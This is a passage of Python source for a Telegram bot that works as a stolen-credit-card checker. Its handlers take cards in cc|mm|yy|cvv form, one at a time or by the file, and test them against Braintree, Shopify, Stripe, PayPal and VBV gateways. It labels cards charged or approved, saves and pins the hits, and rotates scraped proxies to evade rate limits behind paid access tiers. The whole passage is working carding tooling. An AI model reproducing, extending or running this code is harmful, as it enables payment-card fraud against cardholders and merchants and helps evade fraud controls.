                        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                        + "\n\n".join(results_lines)
                    )
                    try:
                        await progress_msg.edit(final_msg)
                        if event.is_group:
                            asyncio.create_task(auto_delete_message(progress_msg))
                    except Exception:
                        fb = await event.reply(final_msg)
                        if event.is_group:
                            asyncio.create_task(auto_delete_message(fb))
                    return

    allowed, remaining = check_cooldown(event.sender_id)
    if not allowed:
        return await event.reply(f"Cooldown: wait {remaining}s")

    remaining_text = remaining_text_raw

    if remaining_text:
        lines = [l.strip() for l in remaining_text.split("\n") if l.strip()]
        multi_cards = []
        for line in lines:
            parsed = parse_card_input(line)
            if parsed:
                multi_cards.append(parsed)

        if len(multi_cards) > 1:
            if not is_mass_check_enabled() and event.sender_id not in ADMIN_ID:
                return await event.reply("Mass checking is currently disabled by admin.")
            INLINE_MASS_LIMIT = get_inline_mass_limit()
            if len(multi_cards) > INLINE_MASS_LIMIT:
                return await event.reply(f"Maximum **{INLINE_MASS_LIMIT}** cards per message. You sent {len(multi_cards)}.")

            if alias in ("b3", "b3c"):
                is_prem = await is_premium_user(event.sender_id)
                if not is_prem and event.sender_id not in ADMIN_ID:
                    return await event.reply("Mass checking on Braintree gates requires **Premium** access.")

            user = await event.get_sender()
            first_name = user.first_name or "User"
            gate_name = flat[alias]["name"]

            try:
                from gates.skool_accounts import get_account_count, get_user_skool_accounts as get_user_skool
                is_admin_user = event.sender_id in ADMIN_ID
                if is_admin_user:
                    skool_count = max(get_account_count(), 1)
                else:
                    user_accts = get_user_skool(event.sender_id)
                    skool_count = len(user_accts) if user_accts else 1
            except Exception:
                skool_count = 1
            concurrency = max(3, min(skool_count, len(multi_cards)))

            progress_msg = await event.reply(f"**Mass Check - {gate_name}**\nChecking {len(multi_cards)} cards... 0/{len(multi_cards)}")

            results_map = {}
            checked_count = 0
            results_lock = asyncio.Lock()
            card_queue = asyncio.Queue()
            for idx, card in enumerate(multi_cards):
                await card_queue.put((idx, card))

            async def inline_worker():
                nonlocal checked_count
                while True:
                    try:
                        idx, (m_cc, m_mm, m_yy, m_cvv) = card_queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                    cc_str = f"{m_cc}|{m_mm}|{m_yy}|{m_cvv}"
                    if not checkLuhn(m_cc):
                        line = f"\u274c `{cc_str}`\n**Response:** Luhn check failed"
                    elif is_bin_banned(m_cc):
                        line = f"\u274c `{cc_str}`\n**Response:** Banned BIN"
                    else:
                        try:
                            gate_timeout = 55 if alias in ("ppn", "pp", "ch", "shp", "bnc", "ppk") else 40
                            resp = await asyncio.wait_for(
                                run_gateway(alias, m_cc, m_mm, m_yy, m_cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID),
                                timeout=gate_timeout
                            )
                            if resp == "NO_SKOOL_ACCOUNT":
                                await event.reply(NO_SKOOL_ACCOUNT_MSG)
                                return
                            resp = resp or "No response"
                            status = classify_response(resp)
                            resp_clean = clean_response(resp)

                            if status == "CHARGED":
                                line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_clean}"
                                await save_approved_card(cc_str, "CHARGED", resp_clean, gate_name, "-", event.sender_id, first_name)
                            elif status == "APPROVED":
                                line = f"\u2705 `{cc_str}`\n**Response:** {resp_clean}"
                                await save_approved_card(cc_str, "APPROVED", resp_clean, gate_name, "-", event.sender_id, first_name)
                            elif status == "DECLINED":
                                line = f"\u274c `{cc_str}`\n**Response:** {resp_clean}"
                            else:
                                line = f"\u26a0 `{cc_str}`\n**Response:** {resp_clean}"
                        except asyncio.TimeoutError:
                            _px = get_user_proxy(event.sender_id)
                            _px_hint = "Your proxy may be dead — /scrapeproxy for free proxies" if _px else "No proxy set — use /scrapeproxy for free proxies"
                            line = f"\u26a0 `{cc_str}`\n**Response:** Gateway Timeout\n⚠️ {_px_hint}"
                        except Exception as e:
                            line = f"\u26a0 `{cc_str}`\n**Response:** {str(e)[:80]}"

                    async with results_lock:
                        results_map[idx] = line
                        checked_count += 1
                        if checked_count % 3 == 0 or checked_count == len(multi_cards):
                            try:
                                await progress_msg.edit(
                                    f"**Mass Check - {gate_name}**\n"
                                    f"Checking {len(multi_cards)} cards... {checked_count}/{len(multi_cards)}"
                                )
                            except:
                                pass
                    card_queue.task_done()

            workers = [asyncio.create_task(inline_worker()) for _ in range(concurrency)]
            await asyncio.gather(*workers)

            result_lines = [results_map[i] for i in range(len(multi_cards)) if i in results_map]

            try:
                await progress_msg.delete()
            except:
                pass

            m_proxy = get_user_proxy(event.sender_id)
            m_p_status = "Live" if m_proxy else "Not Set"
            final_msg = f"**Mass Check - {gate_name}**\n{'=' * 24}\n\n"
            final_msg += "\n\n".join(result_lines)
            final_msg += f"\n\n{'=' * 24}\n**Checked By:** [{first_name}](tg://user?id={event.sender_id})"
            final_msg += f"\n\U0001f310 **Proxy** \u00bb {m_p_status}"
            mass_result = await event.reply(final_msg)
            if event.is_group:
                asyncio.create_task(auto_delete_message(mass_result))
            return

    card_data = None
    if remaining_text:
        card_data = parse_card_input(remaining_text)
    if not card_data and event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card_data = parse_card_input(replied_msg.text)
            if not card_data:
                cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
                found_in_reply = cc_pattern.findall(replied_msg.text)
                if found_in_reply:
                    card_data = parse_card_input(found_in_reply[0])
    if not card_data:
        return await event.reply(f"**Usage:** `/{alias} 4111111111111111|12|25|123`")

    cc, mm, yy, cvv = card_data

    if not checkLuhn(cc):
        return await event.reply("Invalid card number (Luhn check failed).")
    if is_bin_banned(cc):
        return await event.reply("This BIN is banned.")

    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    gate_name = flat[alias]["name"]

    loading_msg = await event.reply(f"\u25e0 Checking on **{gate_name}**...")
    start_time = time.time()

    async def animate_gate_loading():
        spinner = ["\u25dc", "\u25dd", "\u25de", "\u25df"]
        dots = ["", ".", "..", "..."]
        i = 0
        while True:
            try:
                s = spinner[i % 4]
                d = dots[i % 4]
                await loading_msg.edit(f"{s} Checking on **{gate_name}**{d}")
                await asyncio.sleep(0.6)
                i += 1
            except:
                break

    loading_task = asyncio.create_task(animate_gate_loading())

    try:
        if alias == "shp":
            from gates.shopify_native import shopify_native_check_rich

            async def shp_progress(msg):
                try:
                    await loading_msg.edit(f"\u23f3 **Shopify Native** | {msg}")
                except Exception:
                    pass

            result = await asyncio.wait_for(shopify_native_check_rich(cc, mm, yy, cvv, progress_cb=shp_progress), timeout=120)
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)

            r_status = result.get("status", "error")
            r_resp = result.get("response", "Unknown")
            r_gateway = result.get("gateway", "Shopify Payments")
            r_amount = result.get("amount")
            r_site = result.get("site", "")
            r_elapsed = result.get("elapsed", round(time.time() - start_time, 2))

            amount_str = f"  {r_amount}" if r_amount else ""
            cc_str = f"{cc}|{mm}|{yy}|{cvv}"
            bot_tag = BOT_USERNAME or ADMIN_USERNAME
            info_str = f"{brand} - {bin_type} - {level}".upper()

            if r_status == "charged":
                header_icon = "\u2705"
                resp_display = f"Charged \U0001f525"
                await save_approved_card(cc_str, "CHARGED", r_resp, gate_name, r_site, event.sender_id, first_name)
            elif r_status == "live":
                header_icon = "\u26a0\ufe0f"
                resp_display = f"3DS Required \U0001f512"
            elif r_status == "approved":
                header_icon = "\u2705"
                if "ccn live" in r_resp.lower():
                    resp_display = f"CCN LIVE\U0001f387"
                elif "insufficient" in r_resp.lower():
                    resp_display = f"CCN LIVE\U0001f387"
                else:
                    resp_display = f"{r_resp}\U0001f387"
                await save_approved_card(cc_str, "APPROVED", r_resp, gate_name, r_site, event.sender_id, first_name)
            elif r_status == "declined":
                header_icon = "\u274c"
                resp_display = f"Declined \u26d4"
            else:
                header_icon = "\u2753"
                resp_display = f"Error - {r_resp}"

            msg = f"""{header_icon} **Shopify Native**
**Card:** `{cc_str}`
**Response:** {resp_display}
**Gateway** \u21e8 {r_gateway}{amount_str}
**Info** \u21e8 {info_str}
**Issue** \u21e8 {bank} \U0001f3db
**Country** \u21e8 {country} {flag}

**Checked By:** [{first_name}](tg://user?id={event.sender_id})
**Time Taken:** {r_elapsed} seconds"""

            loading_task.cancel()
            await loading_msg.delete()
            result_msg = await event.reply(msg)
            if r_status == "charged":
                await pin_charged_message(event, result_msg)
            if event.is_group:
                asyncio.create_task(auto_delete_message(result_msg))
        else:
            response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
            if response == "NO_SKOOL_ACCOUNT":
                loading_task.cancel()
                try: await loading_msg.delete()
                except: pass
                await event.reply(NO_SKOOL_ACCOUNT_MSG)
                return
            elapsed = round(time.time() - start_time, 2)
            status = classify_response(response)
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)

            if status == "CHARGED":
                status_header = "CHARGED"
                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", response, gate_name, "-", event.sender_id, first_name)
            elif status == "APPROVED":
                status_header = "APPROVED"
                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", response, gate_name, "-", event.sender_id, first_name)
            elif status == "DECLINED":
                status_header = "DECLINED"
            else:
                status_header = "UNKNOWN"

            user_proxy = get_user_proxy(event.sender_id)
            if not user_proxy:
                p_status = "Not Set"
            elif status in ("CHARGED", "APPROVED", "DECLINED"):
                p_status = "Live"
            else:
                p_status = "Dead"
            msg = format_gateway_result(
                status_header, cc, mm, yy, cvv, gate_name, response,
                brand, bin_type, level, bank, country, flag,
                elapsed, first_name, event.sender_id, rank, proxy_status=p_status
            )

            # Proxy notice on timeout
            _resp_lower = (response or "").lower()
            if "timeout" in _resp_lower or "timed out" in _resp_lower:
                if user_proxy:
                    msg += "\n\n⚠️ **Your proxy may be dead** — update it with /setproxy"
                else:
                    msg += "\n\n⚠️ **No proxy set** — add one with /setproxy to avoid gateway timeouts"

            loading_task.cancel()
            await loading_msg.delete()
            result_msg = await event.reply(msg)
            if status == "CHARGED":
                await pin_charged_message(event, result_msg)
                asyncio.create_task(asyncio.to_thread(
                    send_bot_group_log, first_name, event.sender_id,
                    f"{cc}|{mm}|{yy}|{cvv}", gate_name, response, "CHARGED"
                ))
            if event.is_group:
                asyncio.create_task(auto_delete_message(result_msg))
    except Exception as e:
        loading_task.cancel()
        try: await loading_msg.delete()
        except: pass
        await event.reply(f"Error: {e}")

# --- Mass VBV Check (/mvbv) ---
MVBV_MAX = 10

@client.on(events.NewMessage(pattern=r'(?i)^[/\.]mvbv\b'))
async def mvbv_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    await register_user(event.sender_id)

    remaining_text = event.raw_text.split(maxsplit=1)
    raw_cards = remaining_text[1].strip() if len(remaining_text) > 1 else ""

    if not raw_cards and event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            raw_cards = replied_msg.text.strip()

    if not raw_cards:
        return await event.reply(
            "**Mass VBV Check**\n\n"
            f"**Usage:** `/mvbv cc|mm|yy|cvv` (one per line, max {MVBV_MAX})\n\n"
            "**Example:**\n"
            "`/mvbv 4111111111111111|12|25|123\n"
            "4222222222222222|06|26|456`"
        )

    lines = [l.strip() for l in raw_cards.split("\n") if l.strip()]
    cards = []
    for line in lines:
        parsed = parse_card_input(line)
        if parsed:
            cards.append(parsed)

    if not cards:
        return await event.reply("No valid cards found. Use format: `cc|mm|yy|cvv`")

    if len(cards) > MVBV_MAX:
        return await event.reply(f"Maximum {MVBV_MAX} cards per request. You sent {len(cards)}.")

    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)

    progress_msg = await event.reply(f"**Mass VBV Check** - {len(cards)} card(s)\nChecking... 0/{len(cards)}")

    results = []
    approved = 0
    declined = 0
    errors = 0

    for i, (cc, mm, yy, cvv) in enumerate(cards):
        try:
            if not checkLuhn(cc):
                results.append((cc, mm, yy, cvv, "ERROR", "Luhn check failed"))
                errors += 1
                continue

            response = await asyncio.wait_for(
                run_gateway("vbv", cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID),
                timeout=60
            )
            status = classify_response(response)

            if status == "APPROVED":
                approved += 1
                results.append((cc, mm, yy, cvv, "APPROVED", response))
            elif status == "DECLINED":
                declined += 1
                results.append((cc, mm, yy, cvv, "DECLINED", response))
            else:
                errors += 1
                results.append((cc, mm, yy, cvv, status, response))

        except asyncio.TimeoutError:
            errors += 1
            results.append((cc, mm, yy, cvv, "TIMEOUT", "Gateway timeout"))
        except Exception as e:
            errors += 1
            results.append((cc, mm, yy, cvv, "ERROR", str(e)[:80]))

        if (i + 1) % 2 == 0 or i == len(cards) - 1:
            try:
                await progress_msg.edit(
                    f"**Mass VBV Check** - {len(cards)} card(s)\n"
                    f"Checking... {i+1}/{len(cards)}"
                )
            except:
                pass

    try:
        await progress_msg.delete()
    except:
        pass

    status_icons = {"APPROVED": "\u2705", "DECLINED": "\u274c", "UNKNOWN": "\u2753", "ERROR": "\u26a0\ufe0f", "TIMEOUT": "\u23f0"}

    result_lines = []
    for cc, mm, yy, cvv, status, response in results:
        icon = status_icons.get(status, "\u2753")
        resp_short = response[:60] if len(response) > 60 else response
        result_lines.append(f"{icon} `{cc}|{mm}|{yy}|{cvv}` - **{status}**\n    {resp_short}")

    msg = (
        f"**Mass VBV Results**\n"
        f"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n"
        f"\u2705 Approved: {approved} | \u274c Declined: {declined} | \u26a0\ufe0f Errors: {errors}\n"
        f"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n"
    )
    msg += "\n\n".join(result_lines)
    vbv_proxy = get_user_proxy(event.sender_id)
    vbv_p_status = "Live" if vbv_proxy else "Not Set"
    msg += (
        f"\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n"
        f"\U0001f464 Req By \u00bb {first_name} [{rank}]\n"
        f"\U0001f310 Proxy \u00bb {vbv_p_status}\n"
        f"\U0001f916 Bot \u00bb {BOT_USERNAME}"
    )

    await event.reply(msg)

# --- Proxy Management ---
PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxy.txt")

@client.on(events.NewMessage(pattern=r'(?i)^[/]setproxy'))
async def setproxy_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        existing = get_user_proxy_list(event.sender_id)
        if existing:
            proxy_list = "\n".join(f"`{p}`" for p in existing)
            return await event.reply(
                f"**Your Proxies ({len(existing)}):**\n{proxy_list}\n\n"
                f"**Usage:**\n`/setproxy host:port:user:pass` - Add proxy\n"
                f"`/setproxy clear` - Remove all your proxies"
            )
        return await event.reply(
            "**No personal proxies set.**\nYour checks use the shared proxy pool.\n\n"
            "**Usage:**\n`/setproxy host:port:user:pass` - Add your own proxy\n"
            "`/setproxy clear` - Remove all your proxies"
        )

    proxy_input = args[1].strip()
    if proxy_input.lower() == "clear":
        removed = remove_user_proxies(event.sender_id)
        if removed:
            return await event.reply("All your personal proxies cleared. Using shared pool now.")
        return await event.reply("You have no personal proxies to clear.")

    lines = [l.strip() for l in proxy_input.split("\n") if l.strip()]
    valid = []
    invalid = []
    checking_msg = await event.reply(f"Validating {len(lines)} proxy(ies)...")
    for line in lines:
        parts = line.split(":")
        if len(parts) != 4:
            invalid.append(line)
            continue
        host, port, user, pwd = parts
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "http://httpbin.org/ip",
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as resp:
                    if resp.status == 200:
                        valid.append(line)
                    else:
                        invalid.append(line)
        except Exception:
            invalid.append(line)

    if valid:
        for line in valid:
            add_user_proxy(event.sender_id, line)

    result = ""
    if valid:
        result += f"**{len(valid)} proxy(ies) validated and added to your profile.**\n"
    if invalid:
        result += f"**{len(invalid)} proxy(ies) failed validation:**\n"
        result += "\n".join(f"`{p}`" for p in invalid)
    if not valid and not invalid:
        result = "No proxies provided."
    try:
        await checking_msg.edit(result)
    except Exception:
        await event.reply(result)
    return

@client.on(events.NewMessage(pattern=r'(?i)^[/]myproxy$'))
async def myproxy_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    existing = get_user_proxy_list(event.sender_id)
    if existing:
        proxy_list = "\n".join(f"`{p}`" for p in existing)
        return await event.reply(
            f"**Your Proxies ({len(existing)}):**\n{proxy_list}\n\n"
            f"Your checks will use one of these proxies.\n"
            f"`/setproxy clear` to remove all."
        )
    return await event.reply(
        "**No personal proxies set.**\n"
        "Your checks use the shared proxy pool.\n\n"
        "Use `/setproxy host:port:user:pass` to add your own."
    )

@client.on(events.NewMessage(pattern=r'(?i)^[/]scrapeproxy(?:\s+(\d+))?$'))
async def scrapeproxy_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    # Paid-only feature
    _tier = get_user_tier(event.sender_id)
    if _tier == "free":
        return await event.reply(
            "🔒 **Proxy Scraper — Paid Feature**\n\n"
            "Auto-grabbing free proxies is available for **Silver** and **Gold** members only.\n\n"
            "➡️ Use `/setproxy` to add your own proxies, or upgrade your plan to unlock the scraper."
        )

    match = re.match(r'(?i)^[/]scrapeproxy(?:\s+(\d+))?$', event.raw_text.strip())
    max_n = int(match.group(1)) if match and match.group(1) else 10
    max_n = max(1, min(max_n, 20))

    existing = get_user_proxy_list(event.sender_id)
    if len(existing) >= 20:
        return await event.reply("You already have 20 proxies. Use `/setproxy clear` to remove them first.")

    slots_left = 20 - len(existing)
    max_n = min(max_n, slots_left)

    status_msg = await event.reply(
        f"🔍 **Proxy Scraper**\n\n"
        f"Fetching free proxy lists... Please wait (this takes ~30–60s)"
    )

    scraper_script = os.path.join(os.path.dirname(__file__), "proxy_scraper.py")
    loop = asyncio.get_event_loop()

    working_proxies = []
    progress_lines = []

    try:
        proc = await asyncio.create_subprocess_exec(
            "python3", "-u", scraper_script, "scrape", str(max_n),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
            cwd=os.path.dirname(__file__)
        )

        last_edit = time.time()
        result_data = None

        async def read_output():
            nonlocal result_data
            async for raw_line in proc.stdout:
                line = raw_line.decode("utf-8", errors="ignore").strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                    if "progress" in data:
                        progress_lines.append(data["progress"])
                        if len(progress_lines) > 4:
                            progress_lines.pop(0)
                    elif "proxies" in data:
                        result_data = data
                except Exception:
                    pass

        await asyncio.wait_for(read_output(), timeout=90)
        await proc.wait()

        if not result_data or not result_data.get("proxies"):
            await status_msg.edit("❌ No working proxies found. Try again later.")
            return

        added = 0
        for p in result_data["proxies"]:
            if added >= max_n:
                break
            if p not in get_user_proxy_list(event.sender_id):
                add_user_proxy(event.sender_id, p)
                working_proxies.append(p)
                added += 1

        proxy_lines = "\n".join(f"`{p}`" for p in working_proxies)
        await status_msg.edit(
            f"✅ **Proxy Scraper Done**\n\n"
            f"**Tested:** {result_data.get('tested', '?')} proxies\n"
            f"**Added:** {added} working proxies\n\n"
            f"{proxy_lines}\n\n"
            f"These are now set as your proxies. Use `/myproxy` to view them."
        )

    except asyncio.TimeoutError:
        if proc and proc.returncode is None:
            proc.kill()
        if working_proxies:
            await status_msg.edit(
                f"⚠️ Scraper timed out but found {len(working_proxies)} proxy(ies).\n\n"
                + "\n".join(f"`{p}`" for p in working_proxies)
            )
        else:
            await status_msg.edit("⚠️ Proxy scraper timed out. Try again later.")
    except Exception as e:
        await status_msg.edit(f"❌ Scraper error: {str(e)[:100]}")

@client.on(events.NewMessage(pattern=r'(?i)^[/](proxyguide|proxyhelp|pguide)$'))
async def proxy_guide_cmd(event):
    await register_user(event.sender_id)
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())

    sep = "\u2500" * 24
    text = (
        f"\U0001f310 **PROXY SETUP GUIDE**\n{sep}\n\n"
        f"\U0001f4d6 **What is a Proxy?**\n"
        f"A proxy routes your checks through a different IP,\n"
        f"improving speed and avoiding rate limits.\n\n"
        f"{sep}\n"
        f"\U0001f4e6 **Proxy Format:**\n"
        f"`host:port:username:password`\n\n"
        f"\U0001f4dd **Example:**\n"
        f"`proxy.example.com:8080:user123:pass456`\n\n"
        f"{sep}\n"
        f"\u2699\ufe0f **Commands:**\n\n"
        f"\u25cf `/setproxy host:port:user:pass`\n"
        f"  Add a proxy to your profile\n\n"
        f"\u25cf `/setproxy` (no args)\n"
        f"  View your current proxies\n\n"
        f"\u25cf `/setproxy clear`\n"
        f"  Remove all your proxies\n\n"
        f"\u25cf `/myproxy`\n"
        f"  View your proxy list\n\n"
        f"{sep}\n"
        f"\U0001f4a1 **Tips:**\n"
        f"\u25cf Use **residential** or **ISP** proxies for best results\n"
        f"\u25cf **Datacenter** proxies may get blocked faster\n"
        f"\u25cf You can add **multiple** proxies \u2014 the bot rotates them\n"
        f"\u25cf If no proxy is set, the **shared pool** is used\n"
        f"\u25cf Proxies are validated before being added"
    )
    await event.reply(text)


@client.on(events.CallbackQuery(data=b"menu_proxyguide"))
async def menu_proxyguide_cb(event):
    sep = "\u2500" * 24
    text = (
        f"\U0001f310 **PROXY SETUP GUIDE**\n{sep}\n\n"
        f"\U0001f4d6 **What is a Proxy?**\n"
        f"A proxy routes your checks through a different IP,\n"
        f"improving speed and avoiding rate limits.\n\n"
        f"{sep}\n"
        f"\U0001f4e6 **Proxy Format:**\n"
        f"`host:port:username:password`\n\n"
        f"\U0001f4dd **Example:**\n"
        f"`proxy.example.com:8080:user123:pass456`\n\n"
        f"{sep}\n"
        f"\u2699\ufe0f **Commands:**\n\n"
        f"\u25cf `/setproxy host:port:user:pass`\n"
        f"  Add a proxy to your profile\n\n"
        f"\u25cf `/setproxy` (no args)\n"
        f"  View your current proxies\n\n"
        f"\u25cf `/setproxy clear`\n"
        f"  Remove all your proxies\n\n"
        f"\u25cf `/myproxy`\n"
        f"  View your proxy list\n\n"
        f"{sep}\n"
        f"\U0001f4a1 **Tips:**\n"
        f"\u25cf Use **residential** or **ISP** proxies for best results\n"
        f"\u25cf **Datacenter** proxies may get blocked faster\n"
        f"\u25cf You can add **multiple** proxies \u2014 the bot rotates them\n"
        f"\u25cf If no proxy is set, the **shared pool** is used\n"
        f"\u25cf Proxies are validated before being added"
    )
    await event.edit(text, buttons=[[Button.inline("\u25c0 Back to Menu", b"back_main")]])


@client.on(events.NewMessage(pattern=r'(?i)^[/]globalproxy'))
async def globalproxy_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin can manage global proxies!")

    args = event.raw_text.split(maxsplit=1)
    if len(args) < 2:
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                existing = [l.strip() for l in f if l.strip()]
        if existing:
            proxy_list = "\n".join(f"`{p}`" for p in existing[:20])
            extra = f"\n... and {len(existing)-20} more" if len(existing) > 20 else ""
            return await event.reply(
                f"**Global Proxies ({len(existing)}):**\n{proxy_list}{extra}\n\n"
                f"**Usage:**\n`/globalproxy host:port:user:pass` - Add\n"
                f"`/globalproxy clear` - Remove all"
            )
        return await event.reply("**No global proxies set.**")

    proxy_input = args[1].strip()
    if proxy_input.lower() == "clear":
        if os.path.exists(PROXY_FILE):
            os.remove(PROXY_FILE)
        return await event.reply("All global proxies cleared.")

    lines = [l.strip() for l in proxy_input.split("\n") if l.strip()]
    added = 0
    for line in lines:
        parts = line.split(":")
        if len(parts) == 4:
            with open(PROXY_FILE, "a") as f:
                f.write(line + "\n")
            added += 1
    return await event.reply(f"**{added} global proxy(ies) added.**")

# --- Universal Mass Gateway Check (Admin Only, Reply to .txt) ---
ACTIVE_MASS_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/]stopmass$'))
async def stopmass_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin can stop mass checks!")
    if event.sender_id in ACTIVE_MASS_PROCESSES:
        ACTIVE_MASS_PROCESSES.pop(event.sender_id, None)
        return await event.reply("Mass check stopped.")
    return await event.reply("No active mass check found.")

async def process_mass_gateway(event, replied_msg, alias, gate_name):
    user_id = event.sender_id
    if user_id in ACTIVE_MASS_PROCESSES:
        return await event.reply("You already have an active mass check. Wait for it to finish.")

    file_path = os.path.join(tempfile.gettempdir(), f"mass_{alias}_{user_id}.txt")
    try:
        await replied_msg.download_media(file=file_path)
        with open(file_path, "r", errors="ignore") as f:
            content = f.read()
        os.remove(file_path)
    except Exception as e:
        return await event.reply(f"Failed to read file: {e}")

    card_pattern = re.compile(r'(\d{13,19})[|/;:,\s]+(\d{1,2})[|/;:,\s]+(\d{2,4})[|/;:,\s]+(\d{3,4})')
    cards = card_pattern.findall(content)
    if not cards:
        return await event.reply("No valid cards found in the file.")

    _, access_type = await can_use(user_id, event.chat)
    cc_limit = get_cc_limit(access_type, user_id)
    if cc_limit > 0 and len(cards) > cc_limit:
        await event.reply(f"Found {len(cards)} CCs in file. Only first **{cc_limit}** will be checked.")
        cards = cards[:cc_limit]

    total = len(cards)
    mass_start_time = time.time()
    ACTIVE_MASS_PROCESSES[user_id] = True
    await register_mass_user(user_id)

    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(user_id)

    from gates.skool_accounts import get_account_count, warmup_all_sessions, is_warmed_up, refresh_all_clients, reset_all_clients, get_user_skool_accounts, get_all_user_skool_accounts
    concurrency = 3
    skool_tip = ""
    if alias in ("skl", "skl1", "skl2", "auto"):
        is_admin = user_id in ADMIN_ID
        user_skool = get_user_skool_accounts(user_id)
        global_count = get_account_count()
        if is_admin:
            acct_count = max(global_count, 1)
        else:
            acct_count = len(user_skool) if user_skool else 1
        concurrency = max(acct_count, 1)
        if not is_admin and len(user_skool) < 3:
            skool_tip = "\n\U0001f4c8 Add more Skool accounts to increase your checking speed!"
        if not is_warmed_up():
            warmup_msg = await event.reply(f"Warming up Stripe sessions... Wait few seconds")
            warmed = await warmup_all_sessions()
            try:
                await warmup_msg.delete()
            except Exception:
                pass
            if warmed == 0:
                return await event.reply("Stripe login error. Check credentials.")
    elif alias in ("b3", "b3c"):
        concurrency = 3
    elif alias in ("ppn", "pp", "bnc", "ppk"):
        concurrency = 5

    sep = "\u2550" * 19
    charged_count = 0
    approved_count = 0
    declined_count = 0
    error_count = 0
    tds_count = 0
    insf_count = 0
    checked_count = 0
    hits = []
    all_results = []

    stop_key = f"mass_stop_{user_id}".encode()
    _anim_frames = ["\u25f0", "\u25f1", "\u25f2", "\u25f3"]
    _anim_idx = [0]

    def _get_anim():
        frame = _anim_frames[_anim_idx[0] % len(_anim_frames)]
        _anim_idx[0] += 1
        return frame

    def _progress_bar(chk, tot, length=15):
        filled = int(length * chk / tot) if tot > 0 else 0
        return "\u2588" * filled + "\u2591" * (length - filled)

    def _fmt_elapsed():
        secs = int(time.time() - mass_start_time)
        if secs < 60:
            return f"{secs}s"
        mins, s = divmod(secs, 60)
        return f"{mins}m {s}s"

    def make_progress_text(chk, tot, ch, ap, dec, err, tds=0, insf=0, extra=""):
        pct_val = f"{(chk / tot * 100):.1f}" if tot > 0 else "0.0"
        bar_val = _progress_bar(chk, tot)
        anim = _get_anim()
        txt = (
            f"{anim} **Mass Check - {gate_name}**\n{sep}\n\n"
            f"\U0001f525 Charged: **{ch}**\n"
            f"\u2705 Approved: **{ap}**\n"
            f"\U0001f512 3DS: **{tds}**\n"
            f"\U0001f4b3 Insufficient: **{insf}**\n"
            f"\u274c Declined: **{dec}**\n"
            f"\u26a0 Errors: **{err}**\n\n"
            f"Workers: **{concurrency}** | \u23f1 {_fmt_elapsed()}\n"
            f"{bar_val} **{pct_val}%** ({chk}/{tot})"
        )
        if extra:
            txt += f"\n{extra}"
        if skool_tip:
            txt += skool_tip
        return txt

    stop_buttons = [[Button.inline(f"\U0001f6d1 Stop Check", stop_key)]]

    progress_msg = await event.reply(
        make_progress_text(0, total, 0, 0, 0, 0, 0, 0),
        buttons=stop_buttons,
    )

    card_queue = asyncio.Queue()
    results_lock = asyncio.Lock()
    last_update_time = [time.time()]
    consecutive_errors = [0]
    stop_event = asyncio.Event()

    valid_cards = []
    for cc, mm, yy, cvv in cards:
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
        if not checkLuhn(cc):
            declined_count += 1
            checked_count += 1
            all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", "Luhn check failed"))
            continue
        if is_bin_banned(cc):
            declined_count += 1
            checked_count += 1
            all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", "Banned BIN"))
            continue
